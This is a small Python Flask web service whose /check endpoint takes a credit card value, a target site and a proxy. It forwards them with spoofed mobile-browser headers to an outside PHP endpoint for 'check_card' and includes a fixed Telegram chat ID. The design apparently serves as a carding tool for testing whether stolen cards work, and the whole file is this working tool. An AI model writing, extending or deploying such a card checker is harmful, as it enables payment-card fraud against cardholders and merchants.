from flask import Flask, request, jsonify
import requests, json

app = Flask(__name__)

# === BASE CONFIG ===
TARGET_URL = "https://rohitvishal.dev/loda.php"

HEADERS = {
    "accept": "*/*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/json",
    "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "Referer": "https://rohitvishal.dev/vishal.php",
    "Referrer-Policy": "no-referrer-when-downgrade"
}

@app.route("/check", methods=["GET"])
def check_card():
    site = request.args.get("site")
    cc   = request.args.get("cc")
    proxy = request.args.get("proxy")

    if not site or not cc or not proxy:
        return jsonify({
            "error": "Missing required parameters: site, cc, proxy"
        }), 400

    payload = {
        "action": "check_card",
        "site": site,
        "cc": cc,
        "proxy": proxy,
        "telegram_chat_id": "7254736651"   # ← fixed here
    }

    try:
        response = requests.post(
            TARGET_URL,
            headers=HEADERS,
            data=json.dumps(payload)
        )

        return jsonify({
            "status_code": response.status_code,
            "response": response.text
        })

    except Exception as e:
        return jsonify({
            "error": str(e),
            "response": "Request failed",
            "status": "ERROR"
        }), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)